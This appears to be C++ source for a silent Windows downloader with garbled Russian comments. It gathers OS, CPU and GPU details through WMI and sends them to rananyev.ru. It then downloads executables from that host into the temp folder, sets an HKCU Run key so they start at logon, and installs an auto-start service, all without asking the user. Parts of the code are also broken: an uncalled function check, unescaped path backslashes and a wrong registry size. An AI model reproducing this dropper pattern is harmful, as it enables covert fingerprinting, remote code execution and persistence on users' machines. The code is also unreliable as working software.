#include "stdafx.h"
#include <iostream>
#include "windows.h"
#include <wininet.h>
#include <fstream>
#include <atlstr.h>
#include <urlmon.h>
#include <tlhelp32.h>
#include <WbemCli.h>
#include <VersionHelpers.h>
#include <string>

#pragma comment(lib, "wbemuuid.lib")  
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"wininet")

#pragma region Is64BitOperatingSystem()
//   FUNCTION: DoesWin32MethodExist(PCWSTR, PCSTR)
//
//   PURPOSE: The function determins whether a method exists in the export 
//   table of a certain module.
//
//   PARAMETERS:
//   * pszModuleName - the name of the module.
//   * pszMethodName - the name of the method.
//
//   RETURN VALUE: The function returns TRUE if the method specified by 
//   methodName exists in the export table of the module specified by 
//   moduleName.
//
BOOL DoesWin32MethodExist(PCWSTR pszModuleName, PCSTR pszMethodName)
{
	HMODULE hModule = GetModuleHandle(pszModuleName);
	if (hModule == NULL)
	{
		return FALSE;
	}
	return (GetProcAddress(hModule, pszMethodName) != NULL);
}


//
//   FUNCTION: Is64BitOperatingSystem()
//
//   PURPOSE: The function determines whether the current operating system is 
//   a 64-bit operating system.
//
//   RETURN VALUE: The function returns TRUE if the operating system is 
//   64-bit; otherwise, it returns FALSE.
//
BOOL Is64BitOperatingSystem()
{
#if defined(_WIN64)
	return TRUE;   // 64-bit programs run only on Win64
#elif defined(_WIN32)
	// 32-bit programs run on both 32-bit and 64-bit Windows
	BOOL f64bitOS = FALSE;
	return ((DoesWin32MethodExist(L"kernel32.dll", "IsWow64Process") &&
		IsWow64Process(GetCurrentProcess(), &f64bitOS)) && f64bitOS);
#else
	return FALSE;  // 64-bit Windows does not support Win16
#endif
}
#pragma endregion

//„тение ссылки на exe сервиса и сохранение md5 и ссылки в файл
std::wstring readServiceUrl()
{
	std::wstring result = L"";
	// инициализируем WinInet
	HINTERNET hInternet =
		::InternetOpen(
		TEXT("WinInet Test"),
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL, NULL,
		0);
	if (hInternet != NULL) {
		// открываем HTTP сессию
		HINTERNET hConnect =
			::InternetConnect(
			hInternet,
			TEXT("rananyev.ru"),
			INTERNET_DEFAULT_HTTP_PORT,
			NULL, NULL,
			INTERNET_SERVICE_HTTP,
			0,
			1u);

		if (hConnect != NULL) {
			// открываем запрос
			HINTERNET hRequest =
				::HttpOpenRequest(
				hConnect,
				TEXT("GET"),
				TEXT("/iuservice/serviceapp/"),
				NULL,
				NULL,
				0,
				INTERNET_FLAG_KEEP_CONNECTION,
				1);

			if (hRequest != NULL) {
				// посылаем запрос
				BOOL bSend = ::HttpSendRequest(hRequest, NULL, 0, NULL, 0);
				if (bSend) {
					// создаЄм выходной файл
					TCHAR szTempPathBuffer[MAX_PATH];
					GetTempPath(MAX_PATH, szTempPathBuffer);
					std::wstring filePath = szTempPathBuffer;
					filePath += L"\serviceapp.txt";
					std::ofstream fnews(filePath, std::ios::out | std::ios::binary);
					BOOL urlread = FALSE;
					std::string urlReading = "";
					if (fnews.is_open()) for (;;) {
						// читаем данные
						char  szData[1024];
						DWORD dwBytesRead;
						BOOL bRead = ::InternetReadFile(hRequest, szData, sizeof(szData)-1, &dwBytesRead);
						// выход из цикла при ошибке или завершении
						if (bRead == FALSE || dwBytesRead == 0)
							break;
						if (urlread == FALSE)
						{
							int i = 33;
							while (szData[i] != '\n')
							{
								urlReading.append(1, szData[i]);
								++i;
							}
							urlread = TRUE;
						}
						// сохран€ем результат
						szData[dwBytesRead] = 0;
						fnews << szData;
					}
					std::wstring resUrl(urlReading.begin(), urlReading.end());
					result = resUrl;
				}
				//else { std::cout << "req" << std::endl; std::cout << GetLastError(); }
				// закрываем запрос
				::InternetCloseHandle(hRequest);
			}
			//else std::cout << "ses" << std::endl;
			// закрываем сессию
			::InternetCloseHandle(hConnect);
		}
		//else std::cout << "WinInet" << std::endl;
		// закрываем WinInet
		::InternetCloseHandle(hInternet);
	}

	return result;
}

//„тение ссылок на exe приложений и сохранение id, названи€, ссылки и md5 в файл listapp.txt дл€ каждого приложени€
//–аботает только с небольшим количеством ссылок (точно не больше 10, но лучше меньше (сейчас 8)), после последней ссылки на сайте должно быть 2 '\n'
//ƒл€ большего количества надо увеличить количество чаров в szData и помен€ть восьмЄрку в начале этой функции и в цикле мейна.
std::wstring* readAppsUrls(const std::string version)
{
	std::wstring* result = new std::wstring[8]; //8 ссылок
	std::wstring wversion(version.begin(), version.end());
	wversion = L"/iuservice/applist/" + wversion + L".txt";
	// инициализируем WinInet
	HINTERNET hInternet =
		::InternetOpen(
		TEXT("WinInet Test"),
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL, NULL,
		0);
	if (hInternet != NULL) {
		// открываем HTTP сессию
		HINTERNET hConnect =
			::InternetConnect(
			hInternet,
			TEXT("rananyev.ru"),
			INTERNET_DEFAULT_HTTP_PORT,
			NULL, NULL,
			INTERNET_SERVICE_HTTP,
			0,
			1u);

		if (hConnect != NULL) {
			// открываем запрос
			HINTERNET hRequest =
				::HttpOpenRequest(
				hConnect,
				TEXT("GET"),
				wversion.c_str(),
				NULL,
				NULL,
				0,
				INTERNET_FLAG_KEEP_CONNECTION,
				1);

			if (hRequest != NULL) {
				// посылаем запрос
				BOOL bSend = ::HttpSendRequest(hRequest, NULL, 0, NULL, 0);
				if (bSend) {
					// создаЄм выходной файл
					TCHAR szTempPathBuffer[MAX_PATH];
					GetTempPath(MAX_PATH, szTempPathBuffer);
					std::wstring filePath = szTempPathBuffer;
					filePath += L"\listapp.txt";
					std::ofstream applist(filePath, std::ios::out | std::ios::binary);
					std::string urlReading = "";
					if (applist.is_open()) for (;;) {
						// читаем данные
						char  szData[1024];
						DWORD dwBytesRead;
						BOOL bRead = ::InternetReadFile(hRequest, szData, sizeof(szData)-1, &dwBytesRead);
						// выход из цикла при ошибке или завершении
						if (bRead == FALSE || dwBytesRead == 0)
							break;
						int lines = 0;
						int i = 0;
						for (;;)
						{
							urlReading.clear();
							for (int dotCommaCount = 0; dotCommaCount < 1; ++dotCommaCount)
							{
								
								while (szData[i] != ';')
								{
									++i;
								}
								++i;
							}
							while (szData[i] != ';')
							{
								urlReading.append(1, szData[i]);
								++i;
							}
							urlReading.append(1, szData[i]);
							++i;
							while (szData[i] != ';')
							{
								urlReading.append(1, szData[i]);
								++i;
							}
							std::wstring resUrl(urlReading.begin(), urlReading.end());
							resUrl += L"\0";
							*(result + lines) = resUrl;
							++lines;
							while (szData[i] != '\n')
							{
								++i;
							}
							++i;
							if (szData[i] == '\n' || i > 1023) break;
						}
						
						// сохран€ем результат
						szData[dwBytesRead] = 0;
						applist << szData;
					}
					
				}
				else { std::cout << "req" << std::endl; std::cout << GetLastError(); }
				// закрываем запрос
				::InternetCloseHandle(hRequest);
			}
			else std::cout << "ses" << std::endl;
			// закрываем сессию
			::InternetCloseHandle(hConnect);
		}
		else std::cout << "WinInet" << std::endl;
		// закрываем WinInet
		::InternetCloseHandle(hInternet);
	}

	return result;
}

//POST запрос (sort of).
std::string postInfo(const std::string version)
{
	//”знаЄм процессор у видюху
	std::wstring wver(version.begin(), version.end());
	std::wstring Info = L"{Windows version:" + wver + L",";
	std::wstring hdrs = L"Content-Type: application/x-www-form-urlencoded";  //application/x-www-form-urlencoded  application/json\r\n
	HRESULT hRes = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hRes))
	{
		//std::cout << "Unable to launch COM: 0x" << std::hex << hRes << std::endl;
		return "";
	}
	if ((FAILED(hRes = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, 0))))
	{
		//std::cout << "Unable to initialize security: 0x" << std::hex << hRes << std::endl;
		return "";
	}
	IWbemLocator* pLocator = NULL;
	if (FAILED(hRes = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pLocator))))
	{
		//std::cout << "Unable to create a WbemLocator: " << std::hex << hRes << std::endl;
		return "";
	}

	IWbemServices* pService = NULL;
	if (FAILED(hRes = pLocator->ConnectServer(L"root\\CIMV2", NULL, NULL, NULL, WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pService)))
	{
		pLocator->Release();
		//std::cout << "Unable to connect to \"CIMV2\": " << std::hex << hRes << std::endl;
		return "";
	}

	IEnumWbemClassObject* pEnumerator = NULL;
	if (FAILED(hRes = pService->ExecQuery(L"WQL", L"SELECT * FROM Win32_Processor", WBEM_FLAG_FORWARD_ONLY, NULL, &pEnumerator)))
	{
		pLocator->Release();
		pService->Release();
		//std::cout << "Unable to retrive processor: " << std::hex << hRes << std::endl;
		return "";
	}

	IWbemClassObject* clsObj = NULL;
	int numElems;
	while ((hRes = pEnumerator->Next(WBEM_INFINITE, 1, &clsObj, (ULONG*)&numElems)) != WBEM_S_FALSE)
	{
		if (FAILED(hRes))
			break;

		VARIANT vRet;
		VariantInit(&vRet);
		if (SUCCEEDED(clsObj->Get(L"Name", 0, &vRet, NULL, NULL)) && vRet.vt == VT_BSTR)
		{
			Info += L"Processor name:";
			Info += vRet.bstrVal;
			Info += L",";
			VariantClear(&vRet);
		}
		if (SUCCEEDED(clsObj->Get(L"Description", 0, &vRet, NULL, NULL)) && vRet.vt == VT_BSTR)
		{
			Info += L"Processor description:";
			Info += vRet.bstrVal;
			Info += L",";
			VariantClear(&vRet);
		}

		clsObj->Release();
	}

	pEnumerator = NULL;
	if (FAILED(hRes = pService->ExecQuery(L"WQL", L"SELECT * FROM Win32_VideoController", WBEM_FLAG_FORWARD_ONLY, NULL, &pEnumerator)))
	{
		pLocator->Release();
		pService->Release();
		//std::cout << "Unable to retrive video controller: " << std::hex << hRes << std::endl;
		return "";
	}

	clsObj = NULL;
	numElems;
	bool mainVideoControllerRead = FALSE;
	std::string videoController;
	while ((hRes = pEnumerator->Next(WBEM_INFINITE, 1, &clsObj, (ULONG*)&numElems)) != WBEM_S_FALSE)
	{
		if (FAILED(hRes))
			break;

		VARIANT vRet;
		VariantInit(&vRet);
		if (SUCCEEDED(clsObj->Get(L"Name", 0, &vRet, NULL, NULL)) && vRet.vt == VT_BSTR)
		{
			Info += L"Video controller name:";
			Info += vRet.bstrVal;
			if (mainVideoControllerRead == FALSE)
			{
				std::wstring tmpstr = vRet.bstrVal;
				if (tmpstr.c_str()[0] == L'N' || tmpstr.c_str()[0] == L'n')
					videoController = "_nvidia";
				else
					videoController = "_radeon";
				mainVideoControllerRead = TRUE;
			}
			Info += L",";
			VariantClear(&vRet);
		}

		clsObj->Release();
	}
	Info.pop_back();
	Info += L"}";
	pEnumerator->Release();
	pService->Release();
	pLocator->Release();

	// инициализируем WinInet
	HINTERNET hInternet =
		::InternetOpen(
		Info.c_str(),
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL, NULL,
		0);
	if (hInternet != NULL) {
		// открываем HTTP сессию
		HINTERNET hConnect =
			::InternetConnect(
			hInternet,
			TEXT("rananyev.ru"),
			INTERNET_DEFAULT_HTTP_PORT,
			NULL, NULL,
			INTERNET_SERVICE_HTTP,
			0,
			1u);

		if (hConnect != NULL) {
			// открываем запрос
			HINTERNET hRequest =
				::HttpOpenRequest(
				hConnect,
				TEXT("GET"),
				TEXT("/iuservice/datacollector/"), //здесь убрать 123
				NULL,
				NULL,
				NULL,
				INTERNET_FLAG_RELOAD,
				1);

			
			if (hRequest != NULL) {
				// посылаем запрос

				BOOL bSend = ::HttpSendRequest(hRequest, hdrs.c_str(), -1L, (LPVOID)Info.c_str(), sizeof(WCHAR)*Info.length());

				::InternetCloseHandle(hRequest);
			}
			//else std::cout << "ses" << std::endl;
			// закрываем сессию
			::InternetCloseHandle(hConnect);
		}
		//else std::cout << "WinInet" << std::endl;
		// закрываем WinInet
		::InternetCloseHandle(hInternet);
	}

	return videoController;
}

//”становка и запуск сервиса
BOOL InstallAndStartService(const CString& strServiceName, const CString& strDisplayName, const CString& strBinaryPathName)
{
	BOOL bResult = FALSE;

	SC_HANDLE hServiceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (NULL != hServiceControlManager)
	{
		SC_HANDLE hService = CreateService(hServiceControlManager,
			(LPCTSTR)strServiceName,
			(LPCTSTR)strDisplayName,
			SC_MANAGER_ALL_ACCESS,
			SERVICE_WIN32_OWN_PROCESS,
			SERVICE_AUTO_START,
			SERVICE_ERROR_NORMAL,
			(LPCTSTR)strBinaryPathName,
			0,
			0,
			0,
			0,
			0);
		if (hService != NULL)
		{
			StartService(hService, NULL, NULL);
			bResult = TRUE;
			CloseServiceHandle(hService);
		}

		CloseServiceHandle(hServiceControlManager);
	}

	return bResult;
}

/*BOOL StopAndDeleteService(const CString& strServiceName)
{
	BOOL bResult = FALSE;

	SC_HANDLE hServiceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (NULL != hServiceControlManager)
	{
		SC_HANDLE hService = OpenService(hServiceControlManager, (LPCTSTR)strServiceName, SC_MANAGER_ALL_ACCESS);
		if (hService != NULL)
		{
			ControlService(hService, SERVICE_CONTROL_STOP, NULL);
			DeleteService(hService);
			bResult = TRUE;
			CloseServiceHandle(hService);
		}

		CloseServiceHandle(hServiceControlManager);
	}

	return bResult;
}*/

//ѕолучение версии винды
std::string getBitVersion()
{
	std::string version = "";
	if (Is64BitOperatingSystem)
		version += "64";
	else
		version += "32";
	return version;
}

std::string getOSVersion()
{
	std::string version = "";
	if (IsWindowsXPOrGreater())
	{
	version = "";
	version += "xp_";
	}
	if (IsWindowsVistaOrGreater())
	{
	version = "";
	version += "vista_";
	}
	if (IsWindows7OrGreater())
	{
	version = "";
	version += "7_";
	}
	if (IsWindows8OrGreater())
	{
	version = "";
	version += "8_";
	}
	return version;
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd)
//int _tmain(int argc, _TCHAR* argv[])
{
	std::string version = getOSVersion()+getBitVersion();
	std:: string videoVersion = postInfo(version);
	version = getBitVersion() + videoVersion;
	std::wstring serviceUrl = readServiceUrl();
	std::wstring* allUrls = readAppsUrls(version);
	std::wstring appName;
	std::wstring appUrl;
	//TCHAR szPath[MAX_PATH];
	//GetModuleFileName(NULL, szPath, MAX_PATH);
	HKEY newValue;
	TCHAR szTempPathBuffer[MAX_PATH];
	GetTempPath(MAX_PATH, szTempPathBuffer);
	std::wstring filePath = szTempPathBuffer;
	filePath += L"\iuurl.txt";
	std::ofstream urlFile(filePath);
	urlFile << version;
	urlFile.close();
	filePath = szTempPathBuffer;
	filePath += L"\iuservice.exe";
	HRESULT hr1 = URLDownloadToFile(NULL, serviceUrl.c_str(), filePath.c_str(), 0, NULL);
	RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newValue);

	for (int i = 0; i < 8; ++i) //ƒолжно быть <=8 строк
	{
		if (allUrls[i].length() > 0)
		{
			appName = L"";
			std::wstring singleUrl = allUrls[i];
			while (singleUrl.c_str()[0] != L';')
			{
				appName += singleUrl.c_str()[0];
				singleUrl.erase(singleUrl.begin());
			}
			singleUrl.erase(singleUrl.begin());
			filePath = szTempPathBuffer;
			filePath += L"\\" + appName;
			HRESULT hr2 = URLDownloadToFile(NULL, singleUrl.c_str(), filePath.c_str(), 0, NULL);
			RegSetValueEx(newValue, _T("Iservice"), 0, REG_SZ, (LPBYTE)filePath.c_str(), sizeof(LPBYTE)*filePath.size());
		}
	}
	RegCloseKey(newValue);
	
	filePath = szTempPathBuffer;
	filePath += L"\iuservice.exe";
	std::string servicePath(filePath.begin(), filePath.end());
	InstallAndStartService("IUservice", "IUservice", servicePath.c_str());
	
	//system("pause");
	return 0;
}